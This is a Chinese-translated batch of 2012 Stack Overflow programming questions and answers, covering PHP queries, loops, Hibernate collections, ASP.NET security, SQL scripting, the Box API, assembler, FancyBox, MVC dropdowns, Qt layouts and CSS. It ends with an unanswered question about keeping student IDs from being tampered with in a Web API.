因此，此页面上唯一会更改的信息将是变量。我想要的是运行一个查询脚本，以便根据 $currentPage 的 $fileName 如果 $fileName 与某个行名匹配，它会从表中获取该行。

这是找出我的文件名是什么的脚本：

```
//include database connection file
include_once 'connect_to_db.php';

$currentFile = $_SERVER["SCRIPT_NAME"];
$img = array_pop(explode("/", $currentFile));
$fileName$ = basename($img, ".php").PHP_EOL; 
```

我遇到了实际查询脚本的问题。任何人都可以阐明这将如何完成吗？

我的表名是 image_Name

列包括id、name、damage、health、mana。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T23:56:06.527

您应该设计您的表以满足您的需要，在这种情况下是根据参数检索行。

如果`name`表的字段与脚本文件名一致，你应该[使用[PDO](http://php.net/manual/en/book.pdo.php) ]：

```
// Create a connection handler - provide your credentials
$dbh = new PDO('mysql:host=localhost;dbname=yourDbNane','username','password');

// Prepare the query with a placeholder
$dbh->prepare('SELECT * FROM image_Name WHERE name = ?');

// Fill the placeholder with the filename
$dbh->execute( array($fileName) );

// Fetch the result, you are done!
$img = $dbh->fetch(); 
```

# php - PHP 被 for() 语句弄糊涂了

> ID：12648691
> 
> 赞同：1
> 
> 时间：2012-09-28T23:48:40.317
> 
> 标签：php, for-loop

当我编写代码时，我必须使用循环，例如

```
$six = 6;
for ($i = $six; $i > 1; $i--) {
   echo $i."<br>";
} 
```

输出

```
6
5
4
3
2 
```

我也需要它输出 1 我知道我能做到`for ($i = 6; $i >= 1; $i--)`

或 `for ($i = $six+1; $i > 1; $i--)`在评估中，但它令人困惑！事实上，我在使用`for`语句时总是感到困惑。

**编辑：**它令人困惑，因为我不喜欢向后思考。我喜欢在条件`$six > 1`为真时不运行循环，而是在`$six = 1`满足条件之前运行循环。

我猜相反的方式

```
loop_before ($six==1) {
   echo $six.<br />;
   $six--;
} 
```

好吧，即使这个也不会输出 654321 ......我想我只需要回到学校。必须做

```
loop_before ($six<1) {
   echo $six.<br />;
   $six--;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-28T23:49:55.780

只需将您的“基本情况”更改为`$i > 0`

或者，将运算符更改为`$i >= 1`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-29T00:02:22.197

这种混淆可能不仅针对`for()`语句，还针对其他类型的循环。您可以使用`$six >= 1`或`$six > 0`

示例 1

```
$six = 6;
do {
    echo $six . "<br>";
    $six --;
} while ( $six >= 1 ); 
```

示例 2

```
$six = 6;
for($i = $six; $i >= 1; $i --) {
    echo $i . "<br>";
} 
```

示例 3

```
$six = 6;
while ( $six >= 1 ) {
    echo $six . "<br>";
    $six --;
} 
```

最后你可能决定不使用任何默认的 PHP 循环

```
$six = 6;
__loop($six);

function __loop($x) {
    echo $x . "<br>";
    $x --;
    ($x < 1) ? $x : __loop($x);
} 
```

他们都会返回同样的东西

```
6
5
4
3
2
1 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-28T23:55:23.897

为了更清楚地解释，您是说在循环中执行代码 if`$i > 1`

所以如果 $i*是*1 那么它不会执行代码。1 不大于 1。

正如 lojik 所说，使用`$i > 0` 或`$i >= 1`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-29T00:04:18.180

在英语中，for 循环的语法是这样的：

```
At the start of the loop, $i is equal to $six.
Run the loop 'while' $i is greater than 1.
At the end of each running on the looping statement, decrement 1 from $i. 
```

因此，当 $i 减到 1 时，条件语句`$i > 1`不再返回 true，因为它正在检查 $i 是否大于 1。

就像 lojik 说的，使用 $i > 0 或 $i >= 1，因此当 $i 等于 1 时，条件通过并停止，因为在下一个循环中，$i 小于比较值（在您的示例中 1 ）。在 for 循环之后，如果您检查 $i 的值，您将看到它等于 0，这不符合条件。

# java - 在自定义实现中包装 Hibernate PersistentSet 的正确方法？

> ID：12648694
> 
> 赞同：2
> 
> 时间：2012-09-28T23:49:24.707
> 
> 标签：java, hibernate

我已经实现了一个`ObservableSet`包装 Set 并实现 Set 接口和 Observable 模式的类，在添加或删除元素时向注册的侦听器触发事件​​。我想在 Hibernate 映射的类中使用这个 ObservableSet。Hibernate 需要 getter 和 setter `Set`，并将它们设置为`PersistentSet.`As in [this question from 2010](https://stackoverflow.com/questions/6280771/converting-hibernates-persistentset-into-copyonwritearrayset)的实例，我最初尝试向 Getter 和 Setter 添加逻辑，以使用 ObservableSet 包装传入的任何 Set，但这会导致异常：`Exception in thread "main" org.hibernate.HibernateException: A collection with cascade="all-delete-orphan" was no longer referenced by the owning entity instance: ...`

我不需要监听 Hibernate 内部的变化。我主要担心的是，一旦我从数据库中反序列化对象，我就可以监听更改。我可以编写第二个（非beans）getter，它只返回包装器ObservableSet，然后通过编码约定强制我们不改变内部集的内容，除非通过我们通过这个方法获得的包装器，但这看起来很友好的不愉快和hacky。

想法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-06-03T13:20:04.320

您可以使用注解来注解一对多集合，如下所示：

```
@OneToMany(...)
@CollectionType(type = "some.collection.Type")
public Set<Entity> getEntities() {
    return entities;
} 
```

并实现 some.collection.Type 使其包装 PersistentSet：

```
public class TestCollectionType implements UserCollectionType {
    @Override
    public PersistentCollection instantiate(SessionImplementor session, CollectionPersister persister)
                    throws HibernateException {
            return new Wrapper(new PersistentSet(session));
    }
    @Override
    public Object instantiate(int anticipatedSize) {
            return new Wrapper(new HashSet<>());
    }

    @Override
    public PersistentCollection wrap(SessionImplementor session, Object collection) {
            return new Wrapper(new PersistentSet(session, (Set<?>)collection));
    }

    @Override
    public Iterator getElementsIterator(Object collection) {
            return ((Set<?>)collection).iterator();
    }

    @Override
    public boolean contains(Object collection, Object entity) {
            return ((Set<?>)collection).contains(entity);
    }

    @Override
    public Object indexOf(Object collection, Object entity) {
            throw new UnsupportedOperationException();
    }

    @Override
    public Object replaceElements(Object original, Object target, CollectionPersister persister, Object owner,
                    Map copyCache, SessionImplementor session) throws HibernateException {
            ((Set<?>)target).clear();
            ((Set<?>)target).addAll((Set)original);
            return target;
    }
} 
```

List 或 Map 的实现方式相同。

# asp.net - 为什么 ASP.NET 比 ASP Classic 更安全？

> ID：12648698
> 
> 赞同：2
> 
> 时间：2012-09-28T23:50:33.420
> 
> 标签：asp.net, security, asp-classic

我读过几个地方说 ASP.NET 比 ASP Classic 更安全。但从未见过任何关于原因的实际论据。

以标准登录系统为例。用户通过表单向服务器发送用户名和密码。这在两种语言中都是以相同的方式完成的。在这两种语言中，其余的都是在服务器上完成的。为什么在这里选择 ASP.NET 而不是 ASP Classic？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-01T09:44:07.370

正如 ScottRFrost 所提到的，[请求验证](http://www.asp.net/whitepapers/request-validation)默认防止 XSS。就个人而言，我更愿意关闭它并开发一个应用程序来使用 insead 的输出清理（例如 HTML 编码输出到网页，或正确编码和转义 JavaScript 中使用的输出）。这种方法不会限制用户输入，因此不会像请求验证那样限制应用程序功能。例如，它将允许将 HTML 输入到将显示在网页上而不是由浏览器解释的字段中（想象一个不允许发布 HTML 的 HTML 开发人员论坛）。如果您在 ASP.NET 中使用此方法，您将使用与标准 ASP 开发非常相似的方法，即向页面输出变量。

为了回答您的观点，在身份验证期间（验证用户名/密码组合），经典 ASP 和 ASP.NET 之间没有太大区别。ASP.NET 提供了一些可以拖放到页面中的用户控件，并且还提供了[Membership Provider](http://msdn.microsoft.com/en-us/library/yh26yfzy%28v=vs.100%29.aspx)模型，但本质上您必须实现这两种方式的逻辑。

ASP.NET 还包含作为标准的授权组件，因此可以从 web.config 文件中的设置限制对整个应用程序或某些 URL 路径的访问。这可以防止开发人员忘记在每页的基础上进行授权检查。不过，任何更细粒度的访问检查仍需要在 ASP.NET 中手动处理。

ASP.NET 还提供无法通过 Web 服务器读取的专用文件夹，例如 /App_Data。这为存储不应通过 HTTP 直接读取的应用程序相关文件提供了一个方便的位置。您可以在 Classic ASP 中手动执行此操作，但您需要将此目录存储在 Web 根目录之外，或者您需要设置本地文件夹权限，以便 IIS 用户无法读取这些文件。

总而言之，我不会说 ASP.NET 本质上比经典 ASP 更安全，除了新手开发人员不太可能在 ASP.NET 中创建 XSS 易受攻击的网站这一事实。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T23:53:04.417

默认情况下， ASP.NET 包括限制某些常见脚本攻击的[请求验证等功能。](http://www.asp.net/whitepapers/request-validation "请求验证")您可以在经典 ASP 中自己完成，但在 .NET 中是默认设置。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-09-30T06:51:44.197

可能存在安全问题。但我担心一件事。它是关于 SQL 注入的。Asp.net 提供了参数化查询和 HTML 编码解码技术的设施。有关更多信息，请单击链接 [ASP.net 安全性](http://dotnetwindow.blogspot.com/2008/08/sql-injection-and-xss-in-classic-asp.html)

# sql - 来自base的sql脚本

> ID：12648700
> 
> 赞同：0
> 
> 时间：2012-09-28T23:50:50.417
> 
> 标签：sql, ssms, sql-scripts

在我的项目中，数据库模型会定期更改，但由于数据库包含测试数据，因此每次都必须重新输入。快速插入数据的脚本变得相关。目前它是手动完成的。如何使用 sql management studio 做到这一点？我需要一个包含表中数据的脚本（将准备好的数据插入新表），我拥有的数据库模型的脚本。

例如：我有表 [dbo].[Users]，表有 3 列 [Id]，[Login]，[Email] 和货币只包含一个用户（Id = 1，Login = 'Anton'，Email = 'fake @mail.com')...我为我的基础创建脚本，结果会像这样

```
CREATE TABLE [dbo].[Users] (
    [Id] int IDENTITY(1,1) NOT NULL,
    [Login] decimal(1024)  NOT NULL,
    [Email] nvarchar(1024)  NOT NULL,
);

INSERT INTO Users([Id],[Login],[Email]) VALUES(1, 'Anton', 'fake@mail.com') 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T00:00:31.013

实际上有一个独立的官方[工具](http://www.microsoft.com/en-us/download/details.aspx?id=5498)，您可以使用它创建模式和数据转储作为 sql 脚本。只需按照向导并确保您已设置复选框以导出数据。据我所知，它包含在 SQL Management Studio 2008 或更高版本中。

# box-api - 忽略 get_groups、get_group_folders 和 get_group_users 的 page 和 page_size 参数

> ID：12648701
> 
> 赞同：0
> 
> 时间：2012-09-28T23:51:09.573
> 
> 标签：box-api

我正在开发一个使用 Box v1“企业”API 进行用户和组管理的应用程序（v2 API 还没有这些方法）。具体来说，我使用`get_groups`、`get_group_folders`和枚举组及其关联的文件夹和用户`get_group_users`。

我的组织中有大量组和文件夹，我无法翻阅结果；我一次只能从这些 API 中获得 20 个项目。我尝试[了 API 文档](http://developers.box.net/w/page/50135379/get_groups)中列出的`page`和参数的变体，但它们似乎没有做任何事情。`page_size`

具体来说，这三个请求中的每一个都给了我相同的 20 个组：

[https://www.box.net/api/1.0/rest?api_key=XXX&auth_token=YYY&action=get_groups](https://www.box.net/api/1.0/rest?api_key=XXX&auth_token=YYY&action=get_groups)

[https://www.box.net/api/1.0/rest?api_key=XXX&auth_token=YYY&action=get_groups&page=2](https://www.box.net/api/1.0/rest?api_key=XXX&auth_token=YYY&action=get_groups&page=2)

[https://www.box.net/api/1.0/rest?api_key=XXX&auth_token=YYY&action=get_groups&page_size=50](https://www.box.net/api/1.0/rest?api_key=XXX&auth_token=YYY&action=get_groups&page_size=50)

get_group_folders 和 get_group_users 也是如此。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-02T21:04:20.340

对于可选参数，您确实需要在 params[] 中对其进行格式化。例如，在更改 page_size 时，您的请求将是：

[http://box.net/api/1.0/rest?action=get_groups&api_key=API_KEY&auth_token=AUTH_TOKEN&](http://box.net/api/1.0/rest?action=get_groups&api_key=API_KEY&auth_token=AUTH_TOKEN&) **params[page_size]** =VALUE 。

# java - java中的泛型只是检查以确保这是正确的

> ID：12648702
> 
> 赞同：3
> 
> 时间：2012-09-28T23:51:10.843
> 
> 标签：java, generics, bounded-types

我正在努力解决Java中泛型有界量化的这些（类似）问题：

1.  为名为 MyType 的泛型类编写标头。该类应该有一个类型参数。类型参数的上限应该是 String 类。

2.  为名为 MyType 的泛型类编写标头。该类应该有一个类型参数。类型参数的下限应该是 Integer 类。

    ```
    public class myType<T extends String>{} 
    ```

    和

    ```
    public class myType<T extends Integer>{} 
    ```

这是正确的，我真的很难掌握java中泛型的概念吗

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T23:59:46.847

您不使用`extends`同时定义上限和下限。

根据[维基百科关于Java泛型的文章](http://en.wikipedia.org/wiki/Generics_in_Java)......

> 要指定类型通配符的上限，请使用 extends 关键字...

因此，要定义上限，请使用`extends`：

```
public class myType<T extends String>{} 
```

同样，根据[维基百科关于 Java 泛型的文章](http://en.wikipedia.org/wiki/Generics_in_Java)......

> 要指定类型通配符的下界类，使用 super 关键字。

* * *

## 附录

我认为最初提出这个问题的人需要解决一些问题。

*   Java 没有头文件。在 Wikipedia 上查找头文件，[它立即声明 Java 不使用它们](http://en.wikipedia.org/wiki/Header_file#Alternatives)：

    > 一些较新的语言（如 Java）省去了头文件......

*   定义类时不能使用下限 - 我相信它只能使用通配符来完成，在定义类时不使用通配符。该代码`public class MyClass<T super Integer> {}`将给出语法错误：`> expected`

所以总的来说，这个问题充满了胡说八道。

# exception - 异常代码 80000003 - 第一个装配程序

> ID：12648703
> 
> 赞同：2
> 
> 时间：2012-09-28T23:51:41.870
> 
> 标签：exception, assembly, error-handling

在我尝试使用老师给出的宏后，即使更改了文件的主体，我的程序也开始崩溃。该报告给出了异常 80000003。我能找到的唯一信息与断点有关，我看不出我的 asm 代码中如何设置断点。关于这个问题的任何启示都会很棒。谢谢。

提供的宏：debug.h

```
inputW          MACRO  prompt, location
               output prompt
               input text, 8
               atoi text
               mov location, ax
            ENDM

outputW     MACRO   var
               itoa text, var
               mov text + 6, 0
               output text
               output carriage
            ENDM 
```

我的代码：

```
.386
.MODEL FLAT

ExitProcess PROTO NEAR32 stdcall, dwExitCode:DWORD
INCLUDE ../debug.h

CR          EQU    0Dh  ; carriage return character
LF          EQU    0Ah  ; linefeed character

.STACK 4096

.DATA                 ;data storage
num       WORD  ?
prompt1   BYTE  "Enter a number:  ", 0

.CODE
_start:
        inputW prompt1, num 
        outputW num

        INVOKE  ExitProcess, 0 

PUBLIC _start
END 
```

此代码或任何代码都不会运行而不会因异常 80000003 而崩溃

# c# - 如何在单击按钮时显示fancybox（示例）

> ID：12648704
> 
> 赞同：2
> 
> 时间：2012-09-28T23:51:44.893
> 
> 标签：c#, jquery, asp.net, fancybox, code-behind

我有一个 Web 应用程序，并且要求需要将 jquery 灯箱显示为包含一些信息的确认消息。

经过一番研究，我发现了 fancybox [FancyBox Jquery Light box](http://fancyapps.com/fancybox/#useful)

我一步一步地按照这个步骤，直到我可以在一个花哨的框中显示所需的确认消息，这是由`<a href="#popup" class="fancybox">Open</a>`

我需要从 asp:button 后面的代码中触发或显示花哨的框

我进行了很多搜索，但应用时得到的所有结果均无效。

谁能给我看一个关于从c#中asp按钮后面的代码触发fancybox的示例并将其附在此处？

这是我的代码示例：

```
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery   /1.7/jquery.min.js"></script>
<link rel="stylesheet" href="/source/jquery.fancybox.css?v=2.1.0" type="text/css" media="screen" />
<script type="text/javascript" src="/source/jquery.fancybox.pack.js?v=2.1.0"></script>

<script type="text/javascript">
$(".fancybox").fancybox({
    openEffect: 'none',
    closeEffect: 'none',
    afterLoad: function () {
        this.content = this.content.html();
    }
});
</script>

<body>
<form id="form1" runat="server">
    <a href="#test" class="fancybox">Open</a>

    <div id="test" style="display:none;width:300px;">
    <table border="0" cellpadding="0" cellspacing="0">
        <tr>
            <td>
                <input id="Hello" type="text" />
            </td>
        </tr>
        <tr>
            <td>
                <input id="Button1" type="button" value="Press Here" />            
            </td>
        </tr>
    </table>
    </div>
</form>
</body> 
```

此代码工作正常，并在单击打开链接后显示 fancybox 我只需要在单击 asp:button 后显示 fancybox

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T00:01:00.723

要从 Code Behind 调用 javascript，您可以在按钮单击事件处理程序中执行以下操作：

```
ClientScript.RegisterStartupScript(this.GetType(), "fancyBoxScript", "[JAVASCRIPT TO INVOKE FANCYBOX]", true); 
```

这个 javascript 将被发送到页面并在回发完成后执行。

编辑：您可以在此处找到有关通过 javascript 调用 FancyBox 的更多信息。它基本上要求您模拟单击隐藏按钮：[http ://thingsilearned.com/2010/01/27/dynamically-calling-fancybox-from-javascript/](http://thingsilearned.com/2010/01/27/dynamically-calling-fancybox-from-javascript/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T23:57:20.470

确保在 <head> 中有 JQuery 的脚本标记，如下所示：

```
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script> 
```

同样在头部，引用脚本文件本身，以及这样的样式表（假设您已将文件复制到您的网站/fancybox/source 的根目录）：

```
<link rel="stylesheet" href="/fancybox/source/jquery.fancybox.css?v=2.1.0" type="text/css" media="screen" />
<script type="text/javascript" src="/fancybox/source/jquery.fancybox.pack.js?v=2.1.0"></script> 
```

然后，在你的 <body> 底部（但仍然在 body 内部）确保你连接了 fancybox，如下所示：

```
<script type="text/javascript">
    $(document).ready(function() {
        $(".fancybox").fancybox();
    });
</script> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-29T18:52:18.157

如果我理解正确，您想从`html`如下按钮启动 fancybox：

```
<button id="newOpen" type="button">open fancybox from button</button> 
```

....这里重要的是渲染`html`按钮，通过`asp`或任何其他编程语言。另请注意，这`button` **不是**表单的一部分（在 fancybox 中打开）

如果上面是正确的，因为你已经有了从`open`链接启动 fancybox 的代码，那么只需添加这段 jQuery 代码：

```
$("#newOpen").bind("click", function(){
 $(".fancybox").trigger("click");
}); 
```

# jquery - asp.net/MVC 3/razor/jquery/cascading 下拉列表不起作用

> ID：12648707
> 
> 赞同：1
> 
> 时间：2012-09-28T23:52:28.047
> 
> 标签：jquery, asp.net-mvc-3, list, drop-down-menu, cascading

我是 stackoverflow 以及 jquery/javascript 的新手。我整天都在寻找不同的方法来将级联下拉列表添加到我当前的项目中，但还没有找到适合我的方法。我的大部分发现都是过时的，基于 MVC 2 到 webforms 再到旧技术。我确实找到了一些基于 MVC 3/4 的教程和帖子，这些教程和帖子有所帮助，但我仍然要把鼠标放在我的电脑屏幕上。

我查看的一些帮助链接是： [Radu Enuca 的关于级联下拉列表](http://weblogs.asp.net/raduenuca/archive/2011/03/06/asp-net-mvc-cascading-dropdown-lists-tutorial-part-1-defining-the-problem-and-the-context.aspx)的教程 和 [Rick_Anderson 的教程](http://code.msdn.microsoft.com/Cascading-DropDownList-in-833683f9)

该项目的一些背景：

我正在为员工创建一个工作票系统，以将他们的日常时间提交给办公室。我有下面列出的控制器、视图和 jquery 脚本。

控制器

```
public class WorkTicketController : Controller
{
    private Context db = new Context();

    public ActionResult GetClientReps(int id)
    {
        var Reps = from c in db.ClientReps
                   where c.ClientID == id
                   select c;

        List<SelectListItem> clientReps = new List<SelectListItem>();

        foreach (var item in Reps)
        {
            string clientRepId = item.ClientRepID.ToString();

            string clientRepName = item.FirstName + " " + item.LastName;

            clientReps.Add(new SelectListItem(){ Value = clientRepId, Text = clientRepName });
        }

        var List = new SelectList(clientReps, "Value", "Text");

        return Json(List, JsonRequestBehavior.AllowGet);
    }

    public ActionResult Create()
    {
        ViewBag.Clients = GetGlobalItems.ClientList();
        ViewBag.Supervisors = GetGlobalItems.UserListByRole("Supervisor");

        return View();
    }

    protected override void Dispose(bool disposing)
    {
        db.Dispose();
        base.Dispose(disposing);
    }
}
} 
```

看法

```
@model NewbyPortal.Models.WorkTicket

@{
ViewBag.Title = "Create";
}
<article>
<div class="linearBg1">Create Daily Work Ticket</div>
<br />

@using (Html.BeginForm()) {
    @Html.ValidationSummary(true)
    <div class="linearBg1">
        General Information
    </div>
    <div class="section-span-body">
        <table>
            <tr class="empTableRowBody2">
                <th class="empTableRowBody2">
                    @Html.LabelFor(Model => Model.DateWorked) *
                </th>
                <th class="empTableRowBody2">
                    @Html.LabelFor(Model => Model.PayKey)
                </th>
                <th class="empTableRowBody2">
                    @Html.LabelFor(Model => Model.PONumber)
                </th>
                <th class="empTableRowBody2">
                    @Html.LabelFor(Model => Model.WONumber) *
                </th>
            </tr>
            <tr>
                <td>
                    @Html.EditorFor(Model => Model.DateWorked)
                </td>
                <td>
                    @Html.EditorFor(Model => Model.PayKey)
                </td>
                <td>
                    @Html.EditorFor(Model => Model.PONumber)
                </td>
                <td>
                    @Html.EditorFor(Model => Model.WONumber)
                </td>
            </tr>
            <tr class="empTableRowBody2">
                <th class="empTableRowBody2">
                    @Html.LabelFor(Model => Model.ProjectId)
                </th>
                <th class="empTableRowBody2">
                    @Html.LabelFor(Model => Model.ClientID)
                </th>
                <th class="empTableRowBody2">
                    @Html.LabelFor(Model => Model.ClientRepID)
                </th>
                <th class="empTableRowBody2">
                    @Html.LabelFor(Model => Model.SupervisorID) *
                </th>
            </tr>
            <tr>
                <td>
                    @Html.TextBoxFor(Model => Model.ProjectId)
                </td>
                <td>
                    @Html.DropDownList("ClientID", ViewBag.ClientID as SelectList, "Select a Client", new { id = "drop1" })
                </td>
                <td>
                    <select id="drop2"></select>
                </td>
                <td>
                    @Html.DropDownList("SupervisorID")
                </td>
            </tr>
            <tr class="empTableRowBody2">
                <th colspan="2" class="empTableRowBody2">
                    @Html.LabelFor(Model => Model.JobLocation) *
                </th>
                <th colspan="2" class="empTableRowBody2">
                    @Html.LabelFor(Model => Model.JobDescription) *
                </th>
            </tr>
            <tr>
                <td colspan="2">
                    @Html.TextBoxFor(Model => Model.JobLocation, new{@class="textboxlengthlong"})
                </td>
                <td colspan="2">
                    @Html.TextBoxFor(Model => Model.JobDescription, new{@class="textboxlengthlong"})
                </td>
            </tr>
        </table>
    </div>
    <div class="section-span-footer"></div>
    <p>
        <input type="submit" value="Next" />
    </p>
} 
```

脚本

```
<script type="text/javascript">
$(document).ready(function () {
    $("#drop1").change(function () {
        var id = $(this).val();
        $.getJSON("/WorkTicket/GetClientReps/", { id: id },
            function (data) {
            var select = $("#drop2");
            select.empty();
            select.append($('<option/>', {
                value: 0,
                text: "Select a Client Rep"
            }));
            $.each(data, function (index, data) {

                select.append($('<option/>', {
                    value: data.Value,
                    text: data.Text
                }));
            });
        });
    });
});    
</script> 
```

当我从客户端下拉列表中选择客户端时，客户端代表下拉列表没有任何反应。我知道我想念的东西一定很明显，但在这一点上，我不介意看起来像个白痴来解决这个令人沮丧的问题。

我已经验证了其他 jquery 在我的项目中有效，所以据我所知，我没有禁用任何东西。

预先感谢您的帮助！

吨

*更新*

所以我已经向前迈出了一步。我开始在视图上移动我的脚本位置。我尝试了页面的顶部和底部。我还查看了布局页面，以确保我链接到了正确的 jquery 库。这一切都检查了，但它让我思考，所以我将我的脚本移动到它自己的 custom.js 文件中，并在布局页面上链接到它，级联下拉列表开始工作。

我的下一个问题是为什么？我应该保持现在的状态吗？谢谢！

吨

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T00:22:30.213

好的 -> Viewbag 应该是 Viewbag.Clients，而不是 Viewbag.ClientID

```
@Html.DropDownList("ClientID", ViewBag.ClientID as SelectList, "Select a Client", new { id = "drop1" })

<select id="drop2"></select> 
```

同样的...

```
@Html.DropDownList("SupervisorID") 
```

jQuery 代码是好的。

试试这个，然后填写您的代码：

创建.cshtml

```
@{
    ViewBag.Title = "Create";
}

<script type="text/javascript">
    $(document).ready(function () {
        $("#drop1").change(function () {
            var id = $(this).val();
            $.getJSON("/WorkTicket/GetClientReps/", { id: id },
            function (data) {
                var select = $("#drop2");
                select.empty();
                select.append($('<option/>', {
                    value: 0,
                    text: "Select a Client Rep"
                }));
                $.each(data, function (index, data) {

                    select.append($('<option/>', {
                        value: data.Value,
                        text: data.Text
                    }));
                });
            });
        });
    });    
</script>

<div class="linearBg1">Create Daily Work Ticket</div>
<br />

@using (Html.BeginForm())
{
    @Html.ValidationSummary(true)

    @Html.DropDownList("ClientID", ViewBag.Clients as SelectList, "Select a Client", new { id = "drop1" })
    <select id="drop2"></select>

    <div class="section-span-footer"></div>
    <p>
        <input type="submit" value="Next" />
    </p>
} 
```

工作票控制器

```
public class WorkTicketController : Controller
{
    //
    // GET: /WorkTicket/

    public ActionResult Index()
    {
        return View();
    }

    private Context db = new Context();

    public ActionResult GetClientReps(int id)
    {
        /*var Reps = from c in db.ClientReps
                   where c.ClientID == id
                   select c;
        */
        List<SelectListItem> clientReps = new List<SelectListItem>();

        /*foreach (var item in Reps)
        {
            string clientRepId = item.ClientRepID.ToString();

            string clientRepName = item.FirstName + " " + item.LastName;

            clientReps.Add(new SelectListItem() { Value = clientRepId, Text = clientRepName });
        }*/

        clientReps.Add(new SelectListItem() { Value = "10", Text = "name" });

        var List = new SelectList(clientReps, "Value", "Text");

        return Json(List, JsonRequestBehavior.AllowGet);
    }

    public ActionResult Create()
    {
        List<SelectListItem> clientReps = new List<SelectListItem>();
        clientReps.Add(new SelectListItem() { Value = "1", Text = "client 1" });
        clientReps.Add(new SelectListItem() { Value = "2", Text = "client 2" });
        ViewBag.Clients = new SelectList(clientReps, "Value", "Text");
        //ViewBag.Supervisors = GetGlobalItems.UserListByRole("Supervisor");

        return View();
    }

    protected override void Dispose(bool disposing)
    {
        //db.Dispose();
        base.Dispose(disposing);
    }

} 
```

# qt - QT：两个布局添加相同的小部件

> ID：12648709
> 
> 赞同：2
> 
> 时间：2012-09-28T23:52:59.597
> 
> 标签：qt, layout, widget, hide

在 Qt 中：我创建了一个小部件-ui 类，我想让小部件在两个单独的基本小部件（或窗口）中以两种不同的布局出现。所以我想：

```
widget_based_class* inside = new widget_based_class(base_widget1);

QHBoxLayout *lay1=new QHBoxLayout(base_widget1);
base_widget->setLayout(lay1);
lay1->addWidget(inside);
base_widget1.show();

-------------------------------
base_widget1.hide();
QHBoxLayout *lay2=new QHBoxLayout(base_widget2);
base_widget->setLayout(lay2);
lay2->addWidget(inside);
base_widget2.show(); 
```

我怎样才能做到这一点？（我的程序更复杂，我没有看到代码工作。）坦克你。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-29T06:29:52.773

一个 QWidget 只有一个父窗口小部件，并且在该父窗口中只有一个几何图形（位置和大小）。每次调用 QLayout::addWidget() 都会将该小部件重新设置为小部件，布局已安装。

您对 setLayout 的第二次调用将无法按预期工作，因为您必须在设置新的布局管理器之前删除现有的布局管理器：

```
delete base_widget->layout();
base_widget->setLayout(lay2); 
```

如果 base_widget 还没有布局管理器，则布局管理器lay2 将简单地重新设置父级。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-10-08T18:40:24.787

如果小部件永远不会在屏幕上显示两次，我不明白为什么你不能通过 addWidget/removeWidget 重新设置它。

在 OP 中，父窗口小部件/窗口总是在显示另一个之前隐藏。`addWidget`被即时调用。我们也应该`removeWidget`即时调用。应该可以移动小部件。

```
widget_based_class* inside = new widget_based_class(base_widget1);

QHBoxLayout *lay1=new QHBoxLayout(base_widget1);
base_widget->setLayout(lay1);
lay2->removeWidget(inside); // remove widget from other layout
lay1->addWidget(inside);    // add widget to this layout
base_widget1.show();

-------------------------------
base_widget1.hide();
QHBoxLayout *lay2=new QHBoxLayout(base_widget2);
base_widget->setLayout(lay2);
lay1->removeWidget(inside); //remove widget from other layout
lay2->addWidget(inside);    // add widget to this layout
base_widget2.show(); 
```

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-09-29T03:02:39.943

制作一个小部件并在每个布局中使用一个指针？

# html - 悬停在表格元素上的边框弄乱了标准宽度/高度

> ID：12648712
> 
> 赞同：1
> 
> 时间：2012-09-28T23:53:05.377
> 
> 标签：html, css, css-tables

我有一个表格（一个日历），并且在每个 td 元素上都有一个 CSS 悬停。我在这个悬停上设置了一个边框，但是它弄乱了单元格的宽度和高度（即新的边框会将下一行稍微向下推，等等）

有什么办法解决这个问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T23:56:07.250

您可以通过在所有 td 元素上使用与 td 背景颜色相同的边框来解决问题，并且只更改边框的颜色（而不是宽度）以获得与您最初设计的效果非常相似的效果，而不会弄乱宽度和高度。

原始边框对用户来说是不可见的，因为它的颜色与背景相匹配。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-29T00:00:59.960

你可以（如果悬停没有通过过渡平滑）在盒子上有一个填充（比如说 5px），在悬停时你可以添加 2px 的边框并使填充 3px，所以它仍然与 5px 的距离盒子的末端。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-28T23:56:28.053

CSS 因这样做而臭名昭著，因为“边框”属性不会添加到对象的总高度中。它的行为类似于边距。您可以做的是在 CSS 文件中的 <td> 选择器中添加一些边距规则：

```
td.hoverable {
  border:1px solid #00F;
  margin:-1px;
} 
```

这样当您悬停时，新的“边距”规则也会生效，从而将 <td> 的面积减少 1px，这应该允许边框显示。

编辑：哎呀，是的。我的意思是`margin:-1px;`:) 谢谢！

# jquery - Web API 安全-当你必须通过 http 发送学生 ID 时如何保护它

> ID：12648714
> 
> 赞同：2
> 
> 时间：2012-09-28T23:53:11.697
> 
> 标签：jquery, web-services, security

我有一个 WebAPI，我需要发送一个标识学生 ID 的唯一密钥。由于我使用的是 ajax 调用，因此我必须将该唯一的学生 ID 发送到服务以获取该学生的记录。最终用户可以通过查看源代码或开发人员工具以某种方式（隐藏的 html 字段或 url post 或 get 参数）看到这一点。如何防止学生查看我的方案并将 id 更改为另一个学生，从而访问其他人的数据？或者密切相关的查看历史并找出最后一个学生的 id 并访问他们的历史？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-03T14:19:19.690

